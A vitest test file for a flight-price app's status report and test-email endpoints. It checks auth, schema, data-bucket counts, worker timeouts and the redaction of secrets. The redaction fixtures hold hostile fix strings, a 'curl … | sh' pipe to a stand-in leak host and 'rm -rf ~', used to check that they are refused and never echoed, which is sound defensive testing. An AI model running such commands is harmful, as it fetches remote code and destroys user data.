// Spec §10 `GET /status` and `POST /alerts/test-email` (brief WP18 Tasks 18.1 and 18.3): auth and Host, the contract, the
// redaction test (the first failing test), no spending, the 2 s worker bound, the test email's refusals and its
// in-process last result. The worked example only.
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { apiContract, fixedClock, Secret } from '@gmt/core';
import { EmailNotifier } from '@gmt/engine';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { API_TEXT } from '../../src/text.js';
import { expectContract } from '../helpers/contract.js';
import { SENTINEL_AUTH, SENTINEL_SA, SENTINEL_SMTP, SENTINEL_TP, silentLog } from '../helpers/env.js';
import { exampleDefinitionInput } from '../helpers/examples.js';
import { AUTH_USER, basic, createHarness, type Harness, T0 } from '../helpers/harness.js';
import { at, cell, seeder, snapshotOf } from '../helpers/seed.js';
import { tempDir } from '../helpers/tmp.js';
import { stubWorker, WORKER_ENV, WORKER_KEY, workerBody } from '../helpers/workerStub.js';

beforeEach(() => {
  expect.hasAssertions();
});
let h: Harness | undefined;
afterEach(async () => {
  vi.unstubAllGlobals();
  vi.useRealTimers();
  await h?.close();
  h = undefined;
});

const STATUS = apiContract.statusResponseSchema;
const DB_SENTINEL_DIR = 'sentinel-dbpath-4d2f91';
const SOCS_SENTINEL = 'CAESHAgBEhJnd3NfMjAyMzEwMTAtMF9SQzIaAmVuIAEaBgiA_LyaBg';
const URL_SENTINEL = 'https://leak-5b7c.example/path?key=zz-url-secret-91';

/** Every form of a secret a careless serialiser could emit. */
function forms(secret: string): string[] {
  const b = Buffer.from(secret);
  return [secret, b.toString('base64'), b.toString('base64url'), b.toString('hex')];
}

async function harness(env: Record<string, string> = {}, home: string | null = null): Promise<Harness> {
  h = await createHarness({
    env,
    ...(home === null ? {} : { app: { status: { home } } }),
  });
  return h;
}
const get = (x: Harness, o: { auth?: boolean; headers?: Record<string, string> } = {}) =>
  x.request('/api/status', o);

describe('GET /api/status (spec §10)', () => {
  it('needs auth when auth is configured, applies the Host allowlist and validates against the schema', async () => {
    stubWorker();
    const x = await harness();
    expect((await get(x, { auth: false })).status).toBe(401);
    expect((await get(x, { headers: { host: 'rebound.example' } })).status).toBe(403);
    const body = await expectContract(await get(x), 'GET', '/api/status', STATUS);
    expect(body.mode).toBe('native');
    expect(body.version).toBe('unknown');
    expect(body.generatedAt).toBe(T0);
    expect(body.checks.map((c) => c.id)).toEqual(
      expect.arrayContaining(['app', 'database', 'backups', 'schedule', 'data', 'price-sources', 'email']),
    );
  });

  it('an in-memory install reads: a fresh app, no schedule, no definitions, no price source, the fixture provider named', async () => {
    const x = await harness();
    const body = await expectContract(await get(x), 'GET', '/api/status', STATUS);
    const byId = new Map(body.checks.map((c) => [c.id, c]));
    expect(byId.get('schedule')?.state).toBe('off');
    expect(byId.get('data')?.state).toBe('off');
    expect(byId.get('worker')).toMatchObject({ state: 'off', offReason: 'not-set-up' });
    expect(byId.get('provider-fixture')).toMatchObject({
      state: 'warn',
      summary: 'synthetic test data, not fares',
    });
    expect(byId.get('backups')).toMatchObject({
      state: 'ok',
      note: expect.stringContaining('first daily backup due'),
    });
    expect(byId.get('price-sources')?.state).toBe('warn');
  });

  it('reads a definition: the six buckets of its latest finished run, and synthetic prices never counted as prices', async () => {
    const x = await harness();
    const s = seeder(x.ports);
    const def = x.ports.repos.definitions.create(exampleDefinitionInput());
    s.execution('E1', { def, status: 'completed', startedAt: at(-3), finishedAt: at(-2) });
    const c1 = cell('LHR', 'JFK', '2026-11-02', '2026-11-12');
    const c2 = cell('LHR', 'JFK', '2026-11-03', '2026-11-13');
    s.cells('E1', [c1, c2]);
    s.tile('E1', c1, { status: 'priced', fetchedAt: at(-3) });
    s.tile('E1', c2, { status: 'no_data', fetchedAt: at(-3), tileIndex: 1 });
    const body = await expectContract(await get(x), 'GET', '/api/status', STATUS);
    const data = body.checks.find((c) => c.id === `data-${def.id}`);
    expect(data?.summary).toContain(
      'priced 1, no fares 0, no cached data 1, error 0, skipped 0, not searched 0 of 2 cells',
    );
    expect(data?.summary).toContain('no prices yet');
    expect(data?.state).toBe('warn');
  });

  it('a running parent run is "running since", beside the previous finished run', async () => {
    const x = await harness();
    const s = seeder(x.ports);
    const def = x.ports.repos.definitions.create(exampleDefinitionInput());
    s.execution('E1', { def, status: 'completed', startedAt: at(-5), finishedAt: at(-4) });
    s.cells('E1', [cell('LHR', 'JFK', '2026-11-02', '2026-11-12')]);
    s.execution('E2', { def, status: 'running', startedAt: at(-1) });
    const body = await expectContract(await get(x), 'GET', '/api/status', STATUS);
    expect(body.checks.find((c) => c.id === `data-${def.id}`)?.summary).toContain('running since');
  });

  it('a scheduled definition counts as a job; the schedule card reads the engine', async () => {
    const x = await harness();
    const def = x.ports.repos.definitions.create(
      exampleDefinitionInput({ scheduleCron: '0 6 * * 1', scheduleTz: 'Europe/London' }),
    );
    x.engine.scheduler.register(def);
    const body = await expectContract(await get(x), 'GET', '/api/status', STATUS);
    const sched = body.checks.find((c) => c.id === 'schedule');
    expect(sched?.state).toBe('ok');
    expect(sched?.summary).toContain('1 job registered');
  });
});

describe('the data check over a stored run (brief WP18 §6)', () => {
  const days = (n: number) =>
    cell('LHR', 'JFK', `2026-11-${String(n).padStart(2, '0')}`, `2026-11-${String(n + 10).padStart(2, '0')}`);
  const dataOf = async (x: Harness, id: string) =>
    (await expectContract(await get(x), 'GET', '/api/status', STATUS)).checks.find(
      (c) => c.id === `data-${id}`,
    );

  it('the six buckets sum to the cells of the run, whatever the mix', async () => {
    const x = await harness();
    const s = seeder(x.ports);
    const def = x.ports.repos.definitions.create(exampleDefinitionInput());
    s.execution('E1', { def, status: 'completed', startedAt: at(-3), finishedAt: at(-2) });
    const cells = [1, 2, 3, 4, 5, 6, 7, 8].map(days);
    s.cells('E1', cells);
    const [c1, c2, c3, c4, c5, c6] = cells;
    if (
      c1 === undefined ||
      c2 === undefined ||
      c3 === undefined ||
      c4 === undefined ||
      c5 === undefined ||
      c6 === undefined
    )
      throw new Error('eight cells');
    s.tile('E1', c1, { status: 'priced', fetchedAt: at(-3), tileIndex: 0 });
    s.tile('E1', c2, { status: 'priced', fetchedAt: at(-3), tileIndex: 1 });
    s.tile('E1', c3, { status: 'empty', fetchedAt: at(-3), tileIndex: 2 });
    s.tile('E1', c4, { status: 'no_data', fetchedAt: at(-3), tileIndex: 3 });
    s.tileError('E1', [c5], 'upstream', null);
    x.ports.repos.cells.setOutcome(s.id('E1'), c6, 'discovery', 'fixture', {
      status: 'skipped',
      reason: 'budget',
    });
    const c = await dataOf(x, def.id);
    const m =
      /priced (\d+), no fares (\d+), no cached data (\d+), error (\d+), skipped (\d+), not searched (\d+) of (\d+) cells/.exec(
        c?.summary ?? '',
      );
    expect(m).not.toBeNull();
    const [priced, empty, noData, error, skipped, notRun, total] = (m ?? []).slice(1).map(Number);
    expect([priced, empty, noData, error, skipped, notRun, total]).toEqual([2, 1, 1, 1, 1, 2, 8]);
    expect((priced ?? 0) + (empty ?? 0) + (noData ?? 0) + (error ?? 0) + (skipped ?? 0) + (notRun ?? 0)).toBe(
      total,
    );
    expect(c?.state).toBe('warn');
  });

  it('cells a catch-up left for the next scheduled run count under skipped, with their detail words', async () => {
    const x = await harness();
    const s = seeder(x.ports);
    const def = x.ports.repos.definitions.create(exampleDefinitionInput());
    s.execution('E1', { def, status: 'completed', startedAt: at(-3), finishedAt: at(-2) });
    s.cells('E1', [days(1), days(2), days(3)]);
    x.ports.repos.cells.setOutcomesForProvider(s.id('E1'), 'discovery', 'fixture', ['not_run'], {
      status: 'skipped',
      reason: 'scheduled_only',
      skipDetail: 'catch-up-no-browser',
    });
    const c = await dataOf(x, def.id);
    expect(c?.summary).toContain('skipped 3');
    expect(c?.note).toContain('a catch-up loads no browser pages (3 cells)');
    // why: this definition does not use the browser provider, so the words are the engine's "no longer used" form
    expect(c?.note).toMatch(/^not fetched: this search no longer uses the browser provider; /);
  });

  it('a missed firing that was not caught up states the stored code, and is warn', async () => {
    const x = await harness();
    const s = seeder(x.ports);
    const def = x.ports.repos.definitions.create(exampleDefinitionInput());
    x.ports.repos.executions.createForFiring({
      definitionId: def.id,
      isChild: false,
      cell: null,
      snapshot: snapshotOf(def, at(-5)),
      estimate: null,
      trigger: 'schedule',
      status: 'skipped_missed',
      scheduledFor: at(-5),
      skipCode: 'half-cadence',
    });
    expect(s).toBeDefined();
    const c = await dataOf(x, def.id);
    expect(c?.state).toBe('warn');
    expect(c?.summary).toContain('the next scheduled run was less than half the gap away');
  });

  it('a recent catch-up shows as a note on the schedule card, which stays ok', async () => {
    const x = await harness();
    const def = x.ports.repos.definitions.create(
      exampleDefinitionInput({ scheduleCron: '0 6 * * 1', scheduleTz: 'Europe/London' }),
    );
    x.engine.scheduler.register(def);
    const e = x.ports.repos.executions.createForFiring({
      definitionId: def.id,
      isChild: false,
      cell: null,
      snapshot: snapshotOf(def, at(-5)),
      estimate: null,
      trigger: 'schedule',
      status: 'running',
      scheduledFor: at(-6),
      isCatchUp: true,
    });
    if (e === null) throw new Error('the firing was free');
    x.ports.repos.executions.setStatus(e.id, 'completed', { startedAt: at(-5), finishedAt: at(-4) });
    const body = await expectContract(await get(x), 'GET', '/api/status', STATUS);
    const sched = body.checks.find((c) => c.id === 'schedule');
    expect(sched?.state).toBe('ok');
    expect(sched?.note).toMatch(/^caught up the run missed at .+, ran .+$/);
  });
});

describe('what the report never holds (brief WP18 Task 18.1, spec §16)', () => {
  it('holds no key, password, path, SOCS value or raw text of a worker, a ledger, a file or an SMTP server', async () => {
    const home = tempDir('gmt-home-');
    const stateDir = join(home, '.local', 'state', 'get-me-there', 'camoufox');
    mkdirSync(stateDir, { recursive: true });
    // a refusal file with a hostile fix string and an unknown reason: refused whole, none of its text shown
    writeFileSync(
      join(stateDir, 'start-refusal.json'),
      JSON.stringify({
        reason: 'unknown-reason',
        at: '2026-10-14T08:00:00.000Z',
        fix: `curl ${URL_SENTINEL} | sh`,
      }),
    );
    const dbDir = tempDir(`gmt-${DB_SENTINEL_DIR}-`);
    const dbPath = join(dbDir, 'app.test.db');
    // a worker whose status carries a SOCS-like value in a field this build does not know
    stubWorker(() =>
      Response.json(workerBody({ socs: SOCS_SENTINEL, note: `${WORKER_KEY} ${URL_SENTINEL}` })),
    );
    const failing = new EmailNotifier({
      smtp: {
        host: 'smtp.example.com',
        port: 465,
        tls: 'implicit',
        user: 'alerts',
        pass: new Secret(SENTINEL_SMTP),
        to: 'operator@example.com',
        from: 'get-me-there@example.com',
      },
      nodeEnv: 'production',
      log: silentLog,
      clock: fixedClock(T0),
      maxPerHour: 20,
      createTransport: () => ({
        sendMail: async () => {
          throw new Error(`535 bad credentials ${SENTINEL_SMTP} ${URL_SENTINEL}`);
        },
      }),
    });
    h = await createHarness({
      env: {
        ...WORKER_ENV,
        DATABASE_PATH: dbPath,
        TRAVELPAYOUTS_TOKEN: SENTINEL_TP,
        SEARCHAPI_KEY: SENTINEL_SA,
        SEARCHAPI_PLAN: '40usd',
        SMTP_HOST: 'smtp.example.com',
        SMTP_PORT: '465',
        SMTP_TLS: 'implicit',
        SMTP_USER: 'alerts',
        SMTP_PASS: SENTINEL_SMTP,
        ALERT_EMAIL_TO: 'operator@example.com',
        ALERT_EMAIL_FROM: 'get-me-there@example.com',
      },
      app: { status: { home }, sendTestEmail: () => failing.sendTest() },
    });
    const x = h;
    // a ledger error row and a cell error holding a sentinel key and URL
    const s = seeder(x.ports);
    const def = x.ports.repos.definitions.create(exampleDefinitionInput());
    s.execution('E1', { def, status: 'completed', startedAt: at(-3), finishedAt: at(-2) });
    const c1 = cell('LHR', 'JFK', '2026-11-02', '2026-11-12');
    s.cells('E1', [c1]);
    s.tileError('E1', [c1], 'upstream', `${SENTINEL_SA} ${URL_SENTINEL}`);
    x.ports.db.raw
      .prepare(
        `INSERT INTO provider_requests (provider_id, endpoint_path, started_at, finished_at, http_status, outcome, cost_micro_gbp, http_attempt) VALUES ('searchapi', '/search', @t, @t, 401, 'error', 0, 1)`,
      )
      .run({ t: T0 });
    // an SMTP failure whose text holds a sentinel
    expect((await x.request('/api/alerts/test-email', { method: 'POST' })).status).toBe(200);

    const res = await get(x);
    const text = await res.text();
    expect(res.status).toBe(200);
    for (const secret of [
      SENTINEL_AUTH,
      SENTINEL_TP,
      SENTINEL_SA,
      SENTINEL_SMTP,
      WORKER_KEY,
      SOCS_SENTINEL,
      URL_SENTINEL,
      DB_SENTINEL_DIR,
      dbPath,
      home,
      'curl',
      'unknown-reason',
      'leak-5b7c',
    ])
      for (const f of forms(secret)) expect(text, `${f.slice(0, 12)}…`).not.toContain(f);
    // the sentinel run is a failed provider call and an unreadable worker answer, shown by class only
    const body = STATUS.parse(JSON.parse(text));
    const byId = new Map(body.checks.map((c) => [c.id, c]));
    expect(byId.get('provider-searchapi')?.state).toBe('fail');
    expect(byId.get('worker')?.state).toBe('warn');
    expect(byId.get('email')?.state).toBe('fail');
  });

  it('a start-refusal.json with a hostile fix string is refused whole; a good one maps through the shared words', async () => {
    stubWorker(() => {
      throw new Error('connection refused');
    });
    const home = tempDir('gmt-home-');
    const dir = join(home, '.local', 'state', 'get-me-there', 'camoufox');
    mkdirSync(dir, { recursive: true });
    const file = join(dir, 'start-refusal.json');
    writeFileSync(
      file,
      JSON.stringify({ reason: 'consent-expired', at: '2026-10-14T08:00:00.000Z', fix: 'rm -rf ~' }),
    );
    const x = await harness(WORKER_ENV, home);
    let body = await expectContract(await get(x), 'GET', '/api/status', STATUS);
    expect(body.checks.find((c) => c.id === 'worker')?.summary).toBe(
      'not answering, and its refusal file is unreadable',
    );
    writeFileSync(file, JSON.stringify({ reason: 'consent-expired', at: '2026-10-14T08:00:00.000Z' }));
    body = await expectContract(await get(x), 'GET', '/api/status', STATUS);
    expect(body.checks.find((c) => c.id === 'worker')).toMatchObject({
      state: 'fail',
      summary: 'refused, not retrying: the consent record has expired: capture again',
    });
    expect(body.checks.find((c) => c.id === 'consent')?.state).toBe('fail');
    writeFileSync(file, 'not json');
    body = await expectContract(await get(x), 'GET', '/api/status', STATUS);
    expect(body.checks.find((c) => c.id === 'worker')?.summary).toContain('refusal file is unreadable');
  });
});

describe('the report never spends, waits on a vendor or loads a page (spec §10)', () => {
  it('reads nothing but the worker on loopback, and writes no ledger row', async () => {
    const log = stubWorker();
    const x = await harness({
      ...WORKER_ENV,
      TRAVELPAYOUTS_TOKEN: SENTINEL_TP,
      SEARCHAPI_KEY: SENTINEL_SA,
      SEARCHAPI_PLAN: '40usd',
    });
    const rows = () =>
      x.ports.db.raw.prepare<[], { n: number }>('SELECT count(*) AS n FROM provider_requests').get()?.n;
    const before = rows();
    const body = await expectContract(await get(x), 'GET', '/api/status', STATUS);
    expect(rows()).toBe(before);
    expect(log.urls).toEqual(['http://127.0.0.1:8090/v1/status']);
    expect(body.checks.find((c) => c.id === 'worker')?.state).toBe('ok');
    expect(body.checks.find((c) => c.id === 'consent')?.state).toBe('ok');
  });

  it('a worker answering in 3 s is unreachable at 2 s, not a hang', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
    stubWorker(
      () =>
        new Promise<Response>((resolve) => {
          setTimeout(() => resolve(Response.json(workerBody())), 3000);
        }),
    );
    const x = await harness(WORKER_ENV);
    const pending = get(x);
    await vi.advanceTimersByTimeAsync(2000);
    const body = await expectContract(await pending, 'GET', '/api/status', STATUS);
    expect(body.checks.find((c) => c.id === 'worker')).toMatchObject({
      state: 'fail',
      summary: 'not answering',
    });
    expect(body.checks.find((c) => c.id === 'consent')?.state).toBe('warn');
  });

  it('a worker that refuses the key is "keys differ", never its words', async () => {
    stubWorker(() => new Response('nope', { status: 401 }));
    const x = await harness(WORKER_ENV);
    const body = await expectContract(await get(x), 'GET', '/api/status', STATUS);
    expect(body.checks.find((c) => c.id === 'worker')?.summary).toContain('keys differ');
  });

  it('a worker whose shared settings differ fails naming the settings only', async () => {
    stubWorker(() =>
      Response.json(
        workerBody({
          sharedSettings: {
            CAMOUFOX_COOLDOWN_HOURS: '72',
            CAMOUFOX_PAGE_TIMEOUT_SECONDS: '90',
            CAMOUFOX_MODE: 'list',
            CAMOUFOX_GRID_SCROLL_CAP: '30',
            CAMOUFOX_GRID_SCROLL_SPACING_SECONDS: '5',
            CAMOUFOX_MONTHLY_PAGE_CAP: '1500',
            CAMOUFOX_MONTHLY_SCROLL_CAP: '6000',
            CAMOUFOX_BILLING_DAY: '1',
            POINT_OF_SALE: 'GB',
          },
        }),
      ),
    );
    const x = await harness(WORKER_ENV);
    const body = await expectContract(await get(x), 'GET', '/api/status', STATUS);
    const worker = body.checks.find((c) => c.id === 'worker');
    expect(worker?.state).toBe('fail');
    expect(worker?.summary).toContain('CAMOUFOX_COOLDOWN_HOURS');
    expect(worker?.summary).not.toContain('72');
  });

  it('the worker card states the app browser window; the account of calls sits on the provider cards', async () => {
    stubWorker();
    const x = await harness({ ...WORKER_ENV, CAMOUFOX_BROWSER_WINDOW: 'any' });
    const body = await expectContract(await get(x), 'GET', '/api/status', STATUS);
    expect(body.checks.find((c) => c.id === 'worker')?.note).toBe('browser pages: also when a run resumes');
  });

  it('a provider card reads the newest completed call from the ledger by its HTTP class', async () => {
    const x = await harness({
      TRAVELPAYOUTS_TOKEN: SENTINEL_TP,
      SEARCHAPI_KEY: SENTINEL_SA,
      SEARCHAPI_PLAN: '40usd',
    });
    const insert = (provider: string, status: number, outcome: string, t: string) =>
      x.ports.db.raw
        .prepare(
          `INSERT INTO provider_requests (provider_id, endpoint_path, started_at, finished_at, http_status, outcome, cost_micro_gbp, http_attempt) VALUES (@p, '/s', @t, @t, @status, @outcome, 0, 1)`,
        )
        .run({ p: provider, t, status, outcome });
    insert('searchapi', 401, 'error', '2026-10-14T07:00:00.000Z');
    insert('searchapi', 200, 'ok', '2026-10-14T08:00:00.000Z');
    insert('travelpayouts', 402, 'error', '2026-10-14T08:30:00.000Z');
    const body = await expectContract(await get(x), 'GET', '/api/status', STATUS);
    const byId = new Map(body.checks.map((c) => [c.id, c]));
    expect(byId.get('provider-searchapi')?.state).toBe('ok');
    expect(byId.get('provider-searchapi')?.summary).toContain('last successful call');
    expect(byId.get('provider-travelpayouts')?.state).toBe('fail');
    expect(byId.get('price-sources')?.state).toBe('ok');
  });
});

describe('POST /api/alerts/test-email (spec §10)', () => {
  const post = (x: Harness, o: { csrf?: boolean; auth?: boolean } = {}) =>
    x.request('/api/alerts/test-email', { method: 'POST', ...o });
  const withEmail = {
    SMTP_HOST: 'smtp.example.com',
    SMTP_PORT: '465',
    SMTP_TLS: 'implicit',
    SMTP_USER: 'alerts',
    SMTP_PASS: SENTINEL_SMTP,
    ALERT_EMAIL_TO: 'operator@example.com',
    ALERT_EMAIL_FROM: 'get-me-there@example.com',
  };

  it('needs auth and the mutating-route headers', async () => {
    h = await createHarness({ env: withEmail, app: { sendTestEmail: async () => 'sent' } });
    expect((await post(h, { auth: false })).status).toBe(401);
    expect((await post(h, { csrf: false })).status).toBe(415);
  });

  it('is 409 when email is not configured, and sends nothing', async () => {
    const send = vi.fn(async () => 'sent' as const);
    h = await createHarness({ app: { sendTestEmail: send } });
    const res = await post(h);
    expect(res.status).toBe(409);
    expect(await res.json()).toMatchObject({
      error: { code: 'email_not_configured', message: API_TEXT.emailNotConfigured },
    });
    expect(send).not.toHaveBeenCalled();
  });

  it('sends one fixed message and keeps the class and time in the process', async () => {
    const send = vi.fn(async () => 'sent' as const);
    h = await createHarness({ env: withEmail, app: { sendTestEmail: send } });
    const body = await expectContract(
      await post(h),
      'POST',
      '/api/alerts/test-email',
      apiContract.testEmailResponseSchema,
    );
    expect(body).toEqual({ result: 'sent', at: T0 });
    expect(send).toHaveBeenCalledTimes(1);
    const status = await expectContract(await get(h), 'GET', '/api/status', STATUS);
    expect(status.checks.find((c) => c.id === 'email')?.summary).toContain('the last test send was sent at');
  });

  it('is 429 past the hourly ceiling and records a refusal that is not a failure', async () => {
    h = await createHarness({
      env: { ...withEmail, ALERT_EMAIL_MAX_PER_HOUR: '3' },
      app: { sendTestEmail: async () => 'refused' },
    });
    const res = await post(h);
    expect(res.status).toBe(429);
    expect(await res.json()).toMatchObject({
      error: { code: 'email_limit', message: API_TEXT.emailLimit(3) },
    });
    const status = await expectContract(await get(h), 'GET', '/api/status', STATUS);
    expect(status.checks.find((c) => c.id === 'email')?.state).toBe('ok');
  });

  it('a failed send answers "failed" with no server text and turns the email card to fail', async () => {
    h = await createHarness({ env: withEmail, app: { sendTestEmail: async () => 'failed' } });
    const res = await post(h);
    const text = await res.text();
    expect(JSON.parse(text)).toEqual({ result: 'failed', at: T0 });
    const status = await expectContract(await get(h), 'GET', '/api/status', STATUS);
    expect(status.checks.find((c) => c.id === 'email')?.state).toBe('fail');
  });

  it('the harness basic-auth user and password are not part of the report', async () => {
    stubWorker();
    const x = await harness();
    const text = await (
      await x.request('/api/status', { headers: { authorization: basic(AUTH_USER, SENTINEL_AUTH) } })
    ).text();
    expect(text).not.toContain(SENTINEL_AUTH);
  });
});
